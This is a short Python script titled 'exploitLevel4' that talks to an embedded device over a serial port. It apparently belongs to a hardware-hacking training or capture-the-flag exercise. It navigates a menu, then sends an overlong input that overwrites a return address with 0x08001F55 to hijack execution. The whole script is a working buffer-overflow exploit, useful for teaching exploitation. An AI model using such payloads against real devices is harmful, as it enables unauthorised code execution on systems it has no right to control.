# Name:        exploitLevel4
# Author:      @PagetPhil

import serial
import time

# configure the serial connections (the parameters differs on the device you are connecting to)
ser = serial.Serial(port='COM17', baudrate=9600)

ser.close()
#ser.isOpen()
ser.open()

strg = ""
while strg != b"\r\n" :
	strg = ser.readline()
	print(strg)
print(ser.read(20))         # skip "Press ENTER to start"
ser.write(b"\x0D");

strg = ""
while strg != b"\r\n" :
	strg = ser.readline()
	print(strg)
print(ser.read(8))         # skip "Choice: "
ser.write(b"2");

strg = ""
while strg != b"\n" :
	strg = ser.readline()
	print(strg)
print(ser.read(33))         # skip "Please enter 8 random chars max: "
ser.write(b"AAAAAAAAAAAAAAAAAAAAAAAA\x55\x1F\x00\x08\x0D");   # 08001F54

strg = ""
while strg != b"\n" :
	strg = ser.readline()
	print(strg)
print(ser.read(23))         # skip "Press ENTER to continue"
ser.write(b"\x0D");     # BOOM

strg = ""
while strg != b"AZAZAZA\n" :
	strg = ser.readline()
	print(strg)

